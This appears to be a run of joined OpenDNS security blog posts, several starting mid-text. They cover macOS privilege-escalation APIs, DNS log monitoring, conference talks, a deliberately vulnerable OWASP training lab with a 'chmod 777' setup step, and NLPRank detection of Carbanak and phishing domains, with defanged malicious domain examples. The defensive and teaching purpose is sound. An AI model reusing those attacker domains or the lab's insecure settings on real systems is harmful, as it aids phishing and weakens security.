For mobile app developers, distributing apps via the App Store has been a game-changing solution to problems like monetization, marketing, distribution, and update management. Both the Windows and Mac app stores now require apps to be cryptographically signed, and they follow certain sandboxing rules for security. iOS and Android apps are highly restricted when it comes to interacting with the system and other apps, and for good reason.\nLocking down environments at the app level–often called sandboxing–is designed to protect the OS and other apps from malevolence. Each app on iOS has its own self-contained, bundled file system that is separate from the OS and other installed apps. Sandboxing also requires executables to be signed with a valid developer certificate, making them more tamper proof.\nThe “Sandboxed World” is coming. Let’s explore some of the implications and alternatives to current best practices.\nWhat does this mean for PC developers?\nBoth Apple and Microsoft offer app stores for their PC platforms, and running in a sandboxed mode is optional–for now. For mobile developers targeting iOS and Android, sandboxing is mandatory. This is because sandboxing apps is safer, so developers who choose not to embrace sandboxing may find they lose users, depending on the security configuration of their PCs.\n\nOn a Mac, for example, navigating to System Preferences / Security & Privacy / General, a user can find options about which apps to trust. Is the executable signed?  If so, is it signed by a developer who is in the trust chain of the platform provider? Has the app been vetted by the App Store? On Windows 8, users see “Windows Store Apps” (formerly Metro Apps), which similarly are very well sandboxed and signed. Apps can also be restricted by what types of privileges they require, giving the user ultimate granular control of what types of apps can do which functions.\n\nImplications of Sandboxing for Developers\nDeveloping a sandbox app requires a shift in traditional PC approaches. An example of the shift in application life cycle that comes to mind is the waning need for installers. Since, on OSX for example, all application files are self-contained, the entire bundle can be dropped into the Applications folder or just deleted. The footprint is then cleaner as well, leaving no extraneous files that could be manipulated outside control of the app. One might ask: “if installers are no longer necessary, then how will I ask the user for escalated privileges?” There is a legitimate set of software which does need to run with escalated privileges, if the software needs to listen on a low port number, for example.\nIt’s not uncommon to come across mobile apps that require more privileges beyond those available to standard developers. Let’s look at Junos Pulse for iOS as an example. Pulse implements its own SSL VPN–separate from the native iOS system VPN. When first developing Pulse, Juniper needed special approval and joined Apple’s undocumented VPN API. A handful of other developers are doing this as well. In a sandboxed world, the platform providers hold the keys to special app privileges. On a PC, a sandboxed app may also ask the user for special permission using an API, but it is the user who authenticates the app (usually type in an admin password). Let’s take a look at a few of these APIs on Mac OS X.\n\nMac OSX APIs for Escalating Privilege\nAPI: SMJobBless\nThe preferred method of managing privilege escalation on Mac OS X. There are many other APIs in the framework that must be used in conjunction with SMJobBless.\nAPI: AuthorizationExecuteWithPrivileges\nThis API is deprecated. Once used, setuid() can be used to make the process a root process.\nAPI: do shell script “scriptname” with administrator privileges\nThis is an AppleScript mechanism to run a shell script with administrator privileges.\nThe new preferred paradigm stays in line with the “Principle of least privilege.”  Instead of forcing the whole app to run with elevated privilege, “helpers” can do the privileged operations. Because the operation is short-lived, it is less likely that it could be exploited.\nLet’s take a look at the SMJobBless way of doing things while achieving the following goals of:\nPreserving the ability to drag-install the application.\nOperating under the principle of least privilege by isolating privileged code in a separate process instead of having the entire application running with elevated privileges.\nAvoiding the use of setuid binaries.\nRequiring the user to authorize the privileged helper tool only the first time it’s used.\nEnsuring that the tool hasn’t been replaced by another potentially malicious tool.\nEnsuring that the tool hasn’t been co-opted by a different potentially malicious application.\n* (From SMJobBless project Readme.txt https://developer.apple.com/library/mac/samplecode/SMJobBless/Introduction/Intro.html)\nWithin this project we have the actual app and we have the helper.  The helper has two corresponding plist files which would be used by launchd for execution and the traditional Info.plist.\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\n<plist version=\"1.0\">\n    <dict>\n        <key>Label</key>\n        <string>com.apple.bsd.SMJobBlessHelper</string>\n    </dict>\n</plist>\nThe label here “com.apple.bsd.SMJobBlessHelper” will be important later.  Consider the code below (from the project)\n- (BOOL)blessHelperWithLabel:(NSString *)label error:(NSError **)errorPtr;\n\n{\n    BOOL result = NO;\n    NSError * error = nil;\n    AuthorizationItem authItem = { kSMRightBlessPrivilegedHelper, 0, NULL, 0 };\n    AuthorizationRights authRights = { 1, &authItem };\n    AuthorizationFlags flags = kAuthorizationFlagDefaults |\n    kAuthorizationFlagInteractionAllowed |\n    kAuthorizationFlagPreAuthorize |\n    kAuthorizationFlagExtendRights;\n\n    /* Obtain the right to install our privileged helper tool (kSMRightBlessPrivilegedHelper). */\n    OSStatus status = AuthorizationCopyRights(self->_authRef, &authRights, kAuthorizationEmptyEnvironment, flags, NULL);\n\n    if (status != errAuthorizationSuccess) {\n        error = [NSError errorWithDomain:NSOSStatusErrorDomain code:status userInfo:nil];\n    } else {\n        CFErrorRef  cfError;\n\n    /* This does all the work of verifying the helper tool against the application\n    * and vice-versa. Once verification has passed, the embedded launchd.plist\n    * is extracted and placed in /Library/LaunchDaemons and then loaded.

HINT: There are notes about the flags in the Authorization.h\nOnce you have your AuthorizationRef object set up, it’s now time to call SMJobBless() and the helper will get called automatically by launchd after the launchd plist is placed under Library/LaunchDaemons.\nIn order for this to work both must be signed with an appropriate developer certificate obtained from developer.apple.com.\n\nIt’s a Mad Mobile World\nThe vast majority of app developers should not need to worry about such maneuvers. But those who do can enjoy the best of both worlds—sandboxing and privilege. Historically, software vendors needing even tighter OS integration—when installing a kernel module for example—would need platform vendor certification. The platform vendors often have formal third-party programs for this type of integration. It’s a sure bet that, moving forward, PC app development will become more restrictive to mitigate the increasing threat of malware.', 'Security;Security Engineering', 'https://umbrella.cisco.com/blog/2015/03/24/sandboxing-with-privilege-mobile-app-development-for-the-pc-world/');

It also reveals that IT professionals are increasingly feeling pressure to scrap traditional, rigid centralized networks in favor of point solutions and “as-a-service” network connectivity.\nSimilarly, Forrester’s survey data shows that the majority of branch offices rely on some form of direct connection for Internet access, with 40 percent of respondents saying their organizations entirely bypass the WAN at the branch office level. Only 36 percent of organizations backhaul traffic through a WAN connection exclusively before sending it out to the Internet.\nIn many ways, this survey data echoes recent comments made by other leading analyst firms. Late last year, Gartner also stated that increased use of mobile devices and the cloud are leading to a trend in which more and more corporate traffic is bypassing the traditional WAN. Gartner also predicts that by 2018, 25 percent of corporate data traffic will flow directly from mobile devices to the cloud. Data from these and other analyst firms point toward increased business demands for agility, flexibility and worker empowerment trumping centralized IT authority over corporate Internet access.\nForrester survey data also shows that this network change is impacting the way enterprises plan and implement security programs for branch offices.Survey respondents said that only 35 percent of companies are securing access to the Internet for their corporate headquarters (HQ), branch offices, and roaming employees as a single project. The rest are dividing security for these groups into separate initiatives.\nFor more information, and to read the full study, check out the Forrester Technology Adoption Profile on www.opendns.com.', 'Blog;Community;Labs Research', 'https://umbrella.cisco.com/blog/2015/03/24/new-survey-data-branch-office-security/');

Our world of always-connected Internet has opened up a plethora of options for the modern worker that extends far beyond office walls; however, when it comes to security vulnerabilities it’s also a Pandora’s box.\nOne major issue security professionals struggle with is a lack of visibility into their networks—more so now than ever with the introduction of BYOD (bring your own device), IoT (Internet of things), and wearables in the enterprise. Employees can access corporate data anywhere, anytime—the ubiquitous use of smartphones, tablets, and laptops in their personal lives carries over into the office with ease. In a large organization, it can be difficult, or nearly impossible, to track every single device.\nAdding to this challenge is the emergence of shadow IT—when employees use third-party cloud apps to access corporate data, they may not fully understand what information or access they are granting to those third-party companies. Consequently, forgetting to connect securely while using these apps, or not reading terms carefully when choosing a third-party tool could end up leaving a network door wide open for attackers. According to Dana Wolf, senior director of product at OpenDNS, “Attackers are innovators; they’re always looking for the easiest way to get into your system.” When employees skirt around corporate security policies, knowingly or unknowingly, by using unapproved apps, they open up dangerous security gaps—gaps that exist undetected, as potentially malicious traffic may not be collected by logs of any kind.\nSpeaking of logs, security teams use several tools to prevent these threats—and most are likely running a few of them right now. The stack might include a firewall, a web proxy, maybe even regularly-checked AD logs. If a company’s stack also includes OpenDNS, the service provides visibility into DNS logs, which out of every component in a sound security strategy, may be the most important.\nAuthors of the 2014 Verizon Breach Report recommended “[monitoring] and filter[ing] outbound traffic for suspicious and potential exfiltration of data to remote hosts,” also adding that DNS connections are “among the single best sources of data within your organization. Compare these to your threat intelligence, and mine this data often.”\nWhy is DNS data so important? DNS is the backbone of the Internet. When OpenDNS is applied to the enterprise, it adds a layer of protection that can also scour every bit of traffic for malicious requests—whether the employee making the request is on the corporate network or not.\nDNS logs are crucial for another reason. Mandiant’s 2014 M-Trends report revealed that “in 2013, the median number of days attackers were present on a victim network before discovery was 229 days. The longest presence was 2,287 days.” If that attack entered a corporate network through a non-VPN connection from an employee working from home, the SIEM may not have picked it up—but evidence could be found in DNS logs, which can then aid discovery and remediation.\nLast week, OpenDNS announced Log Management, a new integration with Amazon S3 that allows security teams to push DNS logs directly into a S3 instance easily and without much additional administrative overhead. Logs can be stored in this way almost indefinitely (the length of storage depending on user-selected settings). But they don’t have to sit idly: in addition to making compliance folks happy, existing S3 integrations with SIEM vendors such as Splunk or Sumo Logic allow these DNS logs to be imported into a SIEM for further inspection.\nTo learn more even more about why DNS monitoring is an integral part of a well-managed security strategy, and about our new S3 integration, please watch the on-demand webcast today.', 'Blog;Security 101;Umbrella', 'https://umbrella.cisco.com/blog/2015/03/17/opendns-and-amazon-s3-why-dns-log-monitoring-matters/');

They illustrated several actual security situations while quizzing the audience on appropriate mitigations, with prizes for the best answers.\nAdam Kujawa of MalwareBytes spoke on the basics of malware analysis, providing a great introduction to the art and science of guessing the purpose of malicious software. He explained static and dynamic analysis and walked the audience through some great tips and techniques.\nThe first day was closed out with what was referred to as ‘Fire Marshal Talks’, named after an incident many years ago where the local fire marshal ordered the closure of an overly-full conference. The attendees reconvened outside and continued with quick ‘fire talks’, where anyone could speak up about related items of interest.\nThe impromptu fire marshal talks this year ran about 5 to 10 minutes each and were in-depth and entertaining. Speakers covered the topics of physical security, penetration testing and poor shared-hosting practices.\nOne presenter, David Longenecker spoke about an interesting personal project in which he is using intrusion detection software to track when a computer on his home network visits a domain that’s being blocked by OpenDNS. He has created rules that notify him when the domain was categorized as phishing, malware or any of the other classifications we use at OpenDNS when protecting those who use our services.\n\nOn the second day of the conference and in the spirit of the Fire Marshal talks, we had a visit from an actual fire marshal. Larry Jantzen, Battalion Chief of the Austin, TX Fire Department Special Operations explained how the fire department trains and certifies and the methods they use to save lives and keep people safe.\nLater in the day, Antonio Herraiz and Justin Whitehead of One World Labs shared their perspectives on penetration testing by demonstrating their thought processes during pen-testing engagements.\nIn the final talk I was able to attend, Philip Beyer presented on communicating for success in security, in which he provided solid advice on effective professional and personal communication as it relates to the security industry.\nThere were two tracks with simultaneous speakers each day, so I regret not being able to experience all of them. If given the chance, I would have seen every single one!\nHowever, I am so thankful to have been able to attend and present at BSides Austin.

Members of the team are encouraging members of the infosec community to vote for OpenDNS’s crowdsourced sessions as a group on the RSA Conference website or individually, via the links below.\nAndrew Hay, director of security research at OpenDNS Security Labs, will be presenting “The Researcher’s Guide to the Internet of Things,” one of the first sessions to explore actual, anonymized data from IoT devices used on enterprise networks. Gartner reports that by the end of 2017, 20 percent of enterprises will have controls for securing IoT use in the enterprise. Hay plans to present techniques that professionals can use to analyze IoT device use on their own networks. Hay will also discuss some of the surprising findings that were uncovered after analyzing actual enterprise traffic.\nHay will also be presenting another talk on global trends in malware and other attack campaigns. Titled “The Freaks (and Malware) Come Out at Night,” this talk will use new data from a global cross-section of malicious traffic analyzed by OpenDNS. This second session will show the increased prevalence for malware and botnet campaigns to occur at night, when most workers in the Western Hemisphere are using personal devices and are off corporate networks. The talk will include a discussion of the possible reasons for this trend and the implications for security professionals.\nJeremiah O’Connor, security researcher at OpenDNS will present a session discussing the development of NLPRank, a new advanced threat detection model that uses natural language processing techniques. Discussed previously on this blog, NLPRank uses natural language processing coupled with HTML analysis and ASN mapping across billions of DNS records to predict both opportunistic phishing campaigns and attacks directed at high-value targets. O’Connor’s talk, “NLP for APT via DNS” will use examples of in-the-wild attack campaigns and data from older attacks against high-value targets to show the value of this new approach in detecting attacks.\nAccording to the conference website, voting is open to the public, as well as conference attendees, although registered RSA attendees count twice toward the final total.

On the Application Security front, apart from performing security reviews, we also conduct internal security awareness and training exercises.\nWhat Is the Security Ninjas Program?\nSecurity Ninjas is an Application Security Training Program that I created for our software developers here at OpenDNS. It has really helped our developers write more secure code and hence reduced the burden on our security team, so we thought open sourcing it for the benefit of the community.\nThe training program slide deck covers the OWASP Top 10 (2013) vulnerabilities and some general security best practices. The hands-on training lab consists of 10 fun real world like hacking exercises, corresponding to each of the OWASP Top 10 vulnerabilities. Hints and solutions are provided along the way. Although the backend for this is written in PHP, vulnerabilities would remain the same across all web based languages, so the training would still be relevant even if you don’t actively code in PHP.\n\n\nJust a heads up on the timeline (in case you are presenting it): talking through the slides along with hacking the lab takes ~2 hrs.\nWhy Is Application Security Training Important?\nIt’s hard to scale the Security Engineering team with the Software Development teams. It’s practically impossible for the security team to review each line of code before it goes in production.\nIt’s best to train developers so that they are not only able to catch security bugs during peer reviews, but also avoid writing vulnerable code in the first place. This approach scales well with fast dev cycles.\nThis sort of proactive approach also reduces the amount of work that needs to be put in reactively—both by the security team during reviews and by the dev teams while fixing bugs. Meaning? Less friction and faster code deployment!\nThis knowledge also helps developers understand security issues, risks and consequences faster especially when security bugs are reported.\nLast but not the least it makes developers unconsciously care/informed about security.\nMaking the Hands-on Lab Work:\nDocker instructions\nI would highly recommend that you run the training in a docker container because of the following:\nSetting up and destroying the environment would be super easy and quick.\nThe docker container would be sandboxed which means that the vulnerable application wouldn’t be able to harm the host OS.\nSetup:\nSetup docker https://docs.docker.com/installation/. There are many ways to do this depending on the OS you use.\nMake sure docker has been installed correctly by running ‘docker version’.\nStart the Application Security Training container by running the following command (I chose port 8899 to avoid port allocation conflicts): ‘docker run -d -p 8899:80 opendns/security-ninjas’.\nGet the IP address of your container. In my case the command was ‘boot2docker ip’ as I was running docker using boot2docker.\nGo to your web browser and enter <IP address from step 4>:8899.\nThe training should be running now and you should see the home page in your browser window.\nKill the container after you are done.\n\nGo back to the terminal and type ‘docker ps’. Get the container id of the training.\nThen run ‘docker kill {container id}’.\nRunning it using a web server\nIf for some reason you are not able to run the training in a docker container, you may also run it using a web server.\nDownload a web server (like Apache) and PHP.\nDownload the source code from here and put it in the directory where the web server looks for files to serve.\nIn the Security Ninjas sub-directory, change text file permissions: ‘chmod 777 *.txt’\nMake sure WHOIS is installed on the web server.\nStart the web server and reach the application from your web browser.\nThe following steps are optional but recommended (for both Docker and web server):\nInstall Firefox.\nInstall the FoxyProxy plugin for Firefox\n\nIn select mode: Use proxy “Default” for all URLs.\nConfigure the Default proxy to use 127.0.0.1:8080.\nYou can delete or disable this plugin after the exercise.\n\n\nInstall Burp Suite free from http://portswigger.net/burp/download.html. You could use some other proxy tool as well.\nYou can get some basic Burp Suite tutorials from http://portswigger.net/burp/tutorials/.\nYou can turn the proxy off for most of the exercises but for some, having the intercept on would make it much easier to inspect and alter the HTTP requests.\nRun the training in Firefox.\nSuggestions or Comments?\nWe would love to get some feedback!

Today it is a massive, global interconnection of more than 50,000 networks and over two billion people. Most of those users just want to learn, connect, communicate and use the Internet as a grand accelerator for knowledge and business. But today we also have bad actors who use the Internet to steal money and wreak havoc. And yet, we still use the same protocols that were designed when the Internet was a friendlier place and security concerns weren’t a top priority. DNS and BGP are two of these fundamental protocols. They both help people get where they want to go on the Internet, but today bad actors abuse them for nefarious purposes.\nSo as a security company that has pioneered and become the leader of using DNS as a strong vector for raising the bar for threat protection, it should come as no surprise that we’ve expanded our horizons to now include BGP with the acquisition of industry leader BGPMon.\nWhat’s BGP?\nBGP is the protocol that routes traffic across the Internet. For network administrators at large companies that connect to two or more ISPs, as well as to ISPs who connect to other network providers, it’s a key part of their infrastructure. If BGP is hijacked and configured incorrectly, it can cause massive availability and security problems.\nWhy BGPmon? \nWhen it comes to security, IT people are living a new normal. Companies are battling bad actors every day. Attacks are getting more sophisticated. Even worse, they’re harming the credibility of businesses. More troubling, hackers now are targeting places on the Internet no one expects. BGP is one of those areas. We’ve seen many examples like this massive bitcoin heist that demonstrate how bad actors are abusing BGP to hijack or re-route traffic. Or even really sophisticated spammers.\nOpenDNS and BGPmon together bring broader visibility into what’s happening on a corporate network and cloud-delivered security that can discover and catch very sophisticated attacks. The number of attacks involving IP hijacking is either getting bigger (or thanks to BGPMon, people are now starting to notice) and BGP network monitoring and alerting is a powerful enhancement to OpenDNS’s network security.\nBGPmon has built a solid reputation for providing network and routing monitoring services that help companies gain a better understanding of their internet infrastructure and potential security issues brewing from misrouted traffic. OpenDNS can speak from firsthand experience on BGPmon’s value. Part of our business is to monitor the world’s largest security network and look for threats on the Internet. BGPmon increasingly has become one of the data sources we rely on to do this task effectively. And we aren’t the only company that recognizes its value. BGPmon is monitoring corporate networks for thousands of customers including some of the most well-known category leaders all over the world: Internet service providers, financial institutions, technology companies, government organizations and popular consumer web services.\nMoving forward, our integration plan for BGPmon is straightforward. We’ll invest in building out the service and making it more complete—but we also are committed to keeping the free features free. We’ll continue to use BGPmon data and innovate to augment our predictive intelligence and provide better threat protection to OpenDNS customers. So basically status quo for current customers.\nWhile security threats are only going to get more sophisticated, having access to a broader set of technologies and tools that can provide a more holistic view of internet traffic is quickly becoming mission critical—especially for companies with hundreds of thousands of branch offices and globally distributed networks. Integrating BGPmon with OpenDNS means broader network visibility, enhanced predictive threat intelligence, advanced security services and an easy-to-deploy cloud-delivery model. And that’s what we call ‘winning’ in network security.', 'Announcements;Blog', 'https://umbrella.cisco.com/blog/2015/03/12/opendns-acquires-bgpmon/');

It also recommends integrating DNS logs with other threat intelligence sources for stronger correlation and attribution. But despite this, according to the report, most organizations don’t integrate DNS logs into their SIEM, leaving them blind to an entire spectrum of Internet traffic. This blindspot includes traffic from external domains (i.e., most malware command-and-control traffic) and Internet requests using IRC, SSH, and other non-standard ports and protocols.\nA common refrain from infosec analysts, customers, and the broader professional community is you can’t have security without first having visibility. OpenDNS – a leading provider of network security and DNS services – offers a response today by announcing Log Management with Amazon S3, a new way to centrally collect, manage, and store DNS logs in the cloud. Log Management provides a simple cloud-to-cloud storage solution for all of a company’s DNS logs that customers can deploy in less than half an hour. It also takes advantage of pre-built integrations between leading SIEM solutions – such as Splunk – and Amazon S3 to import DNS logs in minutes.\nTo do their work properly, investigators need clear insight into past events. Log Management provides a way to keep DNS log archives long past the time a breach occurs. FireEye reports that it can take businesses an average of 205 days to find a breach, which is why historical data is crucial to investigations. During a post-breach investigation, incident response teams need to retroactively analyze Internet activity to discover all compromised devices – on and off the network. With Log Management, OpenDNS customers get the visibility needed to collect, analyze, and trace breaches to their origin.\nTo trial Log Management with Amazon S3, contact your OpenDNS sales rep or email sales@opendns.com.

The changing threat landscape is resulting in increased security risks for small and medium sized businesses (SMBs), some of whom are turning to managed services providers (MSPs) for help with security solutions. According to Symantec’s 2014 Internet Security Threat Report, “targeted attacks aimed at small businesses (1-250 employees) in 2013 accounted for 30 percent of all such attacks…the trend shows that the proportion of attacks at organizations of this size was increasing throughout the year…” While they may have not previously thought of themselves as high-risk targets, this proves SMBs need to take security seriously, and we know that one of the most effective ways for them to do so is by working with an MSP.\nIn OpenDNS’s webinar, Standardizing and Strengthening Security to Lower Costs, Senior MSP Product Manager Dima Kumets discusses best practices for MSPs in a landscape that is more demanding than ever. Here’s a condensed version of the highlights to help you save time and increase revenue with your OpenDNS partnership.\nRisk Management is All About Layers\nJust like bulletproof glass is made from layers of different materials, a managed security service requires more than one product to be effective. Signature-based tools like antivirus, firewalls, and intrusion prevention are only effective against 30-50% of current security threats. It’s not enough to rely on reactive products, and OpenDNS is a critical layer in your security stack that protects users at the network layer without signatures, and with predictive intelligence. Fortunately, you can deploy Umbrella regardless of your customers’ existing setup. By deploying Umbrella, you gain automated protection from infections, which will give your team breathing room for more important work.\nSave Time With Centralized Settings\nIn streamlining your process with the Centralized Settings feature in Umbrella, you will save time with standardization and automation. Instead of creating exceptions for individual customers, you can manage customers in bulk. Take managing by vertical, for example, since the needs of a doctor’s office are going to be different from those of an elementary school. Customize the solution to your own standard and implement changes once as opposed to repeating the process for every new customer.\nUse the Cloud Services Report to Avoid ‘Surprise’ Tickets\nWith ‘shadow IT,’ employees are buying or using their own consumer cloud services without MSP involvement and often without management’s knowledge. Unknown cloud services can create surprise tickets which then take up valuable MSP time and energy. With OpenDNS’s cloud services report, you can view all cloud services that a customer organization is using. This allows you to regain quick visibility instead of having your most senior tech spend his or her time looking at loglines. The report is also useful for compliance checks. Proactive knowledge of cloud services used by your customers eliminates surprises, saves time, and ensures that you’re not missing out on revenue.\nHire More Efficiently\nWhile in the field with MSPs, Kumets hears a lot about the arduous task of hiring new team members. He says, “At MSP panels, I always hear how difficult it can be to hire good people who are technical and also customer facing, and who share your MSP values.” In reducing tickets by deploying OpenDNS, our MSP partners are able to increase their team’s bandwidth, thereby reducing the need for more hands on deck. One such partner is Mirus IT, an MSP in Milton Keynes, U.K., which saves approximately £60,000 per year in engineering costs with its OpenDNS deployment. We want to help your business grow, and our hope is that with OpenDNS you have the ability to hire on your terms instead of finding yourself in a crunch.\nWhen You’re Saving Time, You’re Saving Money\nPaul Tomlinson, Mirus IT Manager explains, “as a managed service provider we work on a fixed cost, so it’s up to us to reduce our cost of supporting the customer.” Once Tomlinson’s team was able to reduce the time of a typical rebuild from eight hours to “as little as 15 minutes,” Mirus could see that their effective bill rate was improving dramatically.\n\nWe want to help you deliver seamless, reliable security to your SMB customers as efficiently as possible.

While waking up with a cup of coffee, you begin checking email. Among the usual messages, there’s a message about a security update and you click it. Security updates are so common these days that it’s normal to get another email about one. What you don’t know is that your system has just been infected, starting off a long chain of events behind one of the biggest thefts in cyber history.\nThis scenario is similar to how the first successful, large-scale computer bank robbery was launched in January 2013, by a group labeled Carbanak. First mentioned in a recent Kaspersky report, the Carbanak group launched a series of cyber-espionage attacks targeting banks and financial institutions for at least two years. Prior to this report, in December, 2014, Fox-IT Security published information on what may have been a precursor to these attacks about a banking Trojan called Anunak. These attacks resulted in a loss of over one billion dollars across a number of banks from countries such as Ukraine, China, Russia, U.S., and Germany.\nIn the attacks, the malicious actors gained entry to an employee’s computer by utilizing spear phishing techniques to install a backdoor, granting them remote access to the system in order to exfiltrate data. They were then able to move laterally across systems and gain access to administrative accounts, which were used to conduct fraudulent money transfers and control ATMs.\nAs reported by Fox-IT and Kaspersky, these attacks were conducted by an advanced persistent threat (APT) group. OpenDNS Security Labs builds predictive models to track these types of adversarial groups and block domains related to their activities, in order to keep our customers safe. To create these models, we mine our large DNS data infrastructure for data about attacks and then uncover the patterns within. Looking at the data related to these attacks, we found that the domains in this particular Carbanak data set exhibited similar patterns to domains associated with DarkHotel and other APT data sets. Additionally, we were able to collaborate with Michael Sandee from Fox IT security to gain access to data from the Anunak attacks, which had overlap with the Kasperksy report. Let’s take a look at some of the features we were able to extract from the data sets.\nWhen comparing these domains to the DarkHotel data set and other APT domains, we observed that they were constructed in a similar lexical fashion. One of the spoofing techniques often leveraged is the impersonation of a legitimate software or tech company in an email claiming a required software update. Some examples from the different sets were as follows:\nDarkHotel:\nadobeupdates[.]com\nadobeplugs[.]net\nadoberegister[.]flashserv[.]net\nmicrosoft-xpupdate[.]com\nCarbanak:\nupdate-java[.]net\nadobe-update[.]net\nExamples of APT Domains:\ngmailboxes[.]com\nmicrosoft-update-info[.]com\nfirefoxupdata[.]com\nEssentially we are defining a “malicious language” within the lexical nature of DNS traffic, and applying sentiment analysis on FQDNs. In an attempt to construct this language, we have created a corpus of domains that elicit a common pattern where adversaries merge together certain dictionary words and tech company strings. Here are some examples from our corpus:\nfacebooklogin-facebook[.]com\nsecurity-paypal-center[.]com\nsecuritycheck-paypal[.]com\nbillingupdate-paypal[.]com\nWe also observed patterns in WHOIS information from some of the Anunak/Carbanak domains many of which are registered with Bizcn.com, Inc. For example:\n\nDetails for update-java[.]net\n\nWhen conducting our investigations with OpenDNS Investigate, we found that there were multiple examples of suspicious looking domains advertising “java updates”. Additionally they all exist on the same infrastructure, are lexically similar, and exhibit similar interesting patterns:\n\nOpenDNS Security Labs specializes in developing new threat detection models to identify different types of attacks. One of the newest additions to our arsenal is NLPRank. Utilizing natural language processing (NLP), the predictive model identifies potentially malicious typo-squatting/targeted phishing domains. APT groups often use spear-phishing techniques and legitimate domain spoofing as an obfuscation technique to carry out their criminal campaigns. NLPRank is designed to detect these fraudulent branded domains that often serve as C2 domains for targeted attacks. Our system utilizes heuristics such as NLP, ASN mappings and weightings, WHOIS data patterns, and HTML tag analysis to classify these type of attack domains. NLPRank uses a minimum edit-distance on substrings to check for the word distance between legitimate and typo-squatting domains (ex. malware.com vs. rnalware.com, linkedin.com vs. 1inkedin.net).\nLet’s step back and discuss high-level how the edit-distance algorithm works. Minimum edit-distance is a shortest-path, dynamic-programming algorithm  that checks for similarity between 2 strings. The minimum edit-distance between 2 strings is defined as the minimum number of edits it takes (ex. insertion, deletion, substitution) to turn string A into string B. Basically anytime you have to make an edit you incur a penalty. We are searching for the least path (sequence of edits), from our initial string to our goal string.\nInitial state: string we’re transforming\nOperations: insert, delete, substitution\nGoal state: final string\nPath cost: minimized # of edits\nWord Example:\nInitial String:\ni n c e _ p t i o n\nGoal String:\n_ e x e c u t i o n\nFor this example, there are 5 edits, 3 substitutions, 1 deletion, 1 insertion, making the penalty 5.\nDomain example:\nInitial Domain:\ng00gle.com\nGoal Domain:\ngoogle.com\nFor this example, there are 2 edits, 2 substitutions, making the penalty 2.\nSome real-world applications of the edit-distance algorithm are seen in spell-checking, information retrieval, machine translation, speech recognition, computational biology to align nucleotide sequences, and now information security. The intuition behind using this algorithm is that essentially we’re trying to define a language used by malicious domains vs. a language of benign domains in DNS traffic.\nAnother way NLPRank detects fraudulent domain behavior is observing domains hosted on ASNs that are unassociated with the company they’re spoofing. We leveraged OpenDNS SecurityGraph’s vast amount of ASN data to investigate different types of attacks in our user’s DNS data. We used this to build up an ASN map of all legitimate domains mapping to their appropriate ASNs. For example, you would expect an Adobe domain advertising an update to be associated with an ASN associated with Adobe (ex. 14365, 44786, etc.), or a Java update to be associated with an Oracle ASN (ex. 41900, 1215,  etc.). Both of the Carbanak domains mentioned above using those company names as substrings came from: ASN 44050, PIN-AS Petersberg Internet Network LLC in Russia.\nNLPRank, which also detected some of these Anunak/Carbanak domains, was recently used to identify a cluster of advanced Paypal Phishing Attacks that we detailed on this blog. It was also able to identify many similar types of of phishing attacks spoofing major companies including: Google/Gmail, WellsFargo, Facebook, Dropbox, Apple/iTunes, and many more from Paypal. We also found that attackers use kits and tools such as HTTrack to copy legitimate sites. Here is a snippet of code we found in the HTML of one of these Phishing sites outlining tool used to copy the site:\nOne of the interesting things we found was that certain tags were directly copied from the legitimate site. For example some the links found for jobs on spoofed Paypal pages, would be directly linked to the jobs page on the legitimate Paypal site.\nHere is just a few of the screenshots of NLPRank’s findings:\nGoogle/Gmail Phishing Site\n\nFacebook phishing site\nWellsFargo PhishingMultiple Company Typo-squatting on “google”\nAdobe spoofing using Dropbox Webpage\nA bunch of Paypal Phishing sites\n\nHere is another Paypal which was a redirect from the domain email-paypal[.]info\nOne can see from the above examples that NLPRank is succeeding in identifying domain spoofing/targeted phishing attacks, and is a robust method for defending against APT attacks such as Anunak/Carbanak. Our labs team will continue to develop NLPRank threat model to discover more of these type of targeted attacks domains and keep our customers safe.', 'Big Data;Incident Response;Malware;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/03/05/nlp-apt-dns/');

Looking at data related to these attacks, he could intuitively see that the domain names followed patterns similar to those associated with the Mandiant APT1 espionage group.\n“The way that attackers ‘sell’ a spear phishing attack is by spoofing a domain so that it looks like it comes from a legitimate company,” O’Connor said. “After running detailed analytics on the data from these types of campaigns, I found that these domain names were predictable.”\nUsing data from these two campaigns as a test set, O’Connor was able to start building NLPRank. This new model compiles a dictionary of popular, legitimate domain names used in spear phishing (such as “java,” “gmail” or “adobe”) and compares it with a list of the most common English words used in targeted phishing campaigns (“install,” “update,” “download” etc.). NLPRank then uses alignment techniques from computational biology to grade permutations of these domain names, like “install-ad0be”, and then judge the likelihood they will be used in spear phishing.\nThe next step is to apply a variety of techniques, such as ASN mappings, WHOIS data and HTML analysis to classify the type of attack being delivered. This process is applied by NLPRank across the billions of DNS records that OpenDNS observes every day.\nThis first iteration of NLPRank successfully built a lexicon that understood the malicious language behind these domains. It already has been used to detect a number of sophisticated phishing campaigns in the wild, such as the PayPal phishing sites reported by OpenDNS Security Labs earlier this month. The only thing missing was a list of domains from a recent, sophisticated and highly-successful phishing campaign to validate the list of domains that O’Connor was collecting every single day.\nIn the Carbanak  campaign, attackers used techniques and malware borrowed from commodity banking trojans to pull off one of the most successful bank robberies in history–making it an ideal test case for NLPRank. After researchers from Kaspersky shared their data with the OpenDNS Security Labs team, O’Connor knew that his new model was effective. “When I looked at Kaspersky’s data, I could see the command-and-control domains,” he said. “NLPRank had caught them weeks before.”\nAccording to OpenDNS senior security researcher Dhia Mahjoub, Ph.D., bad actors borrow tricks from commodity phishing attacks to hide the command and control traffic for targeted attacks. “The great thing about NLPRank is that the model uses the bad guys’ tricks against them and is generic enough to detect both types of attacks,” Mahjoub said. “This result is a great example of how the work we do at OpenDNS Security Labs allows researchers to use their security knowledge, technical background and innate creativity to make intuitive leaps.”\nO’Connor says another thing that makes NLPRank unique is that it is applied in real-time to actual domains detected by OpenDNS’s worldwide data infrastructure. “Other methods of detecting malicious domains generate massive data sets that can miss combinations of domain names not predicted by their models,” he said. “NLPRank looks at every domain name in the context of not only the combinations of letters and numbers involved, but also a domain’s location on the Internet. We can see correlations between attack campaigns and use that knowledge to understand if they are connected.”\nEarlier this week at a private research conference, O’Connor unveiled NLPRank for the first time. “Companies that have to deal with spear phishing attacks on a regular basis are very excited about this model,” he said. “It’s one of the only ways to detect spear phishing campaigns without analyzing malware in detail.”\nNext steps for O’Connor and his work on NLPRank? He plans to continue building out the dictionaries that define the malicious language and sharing his work 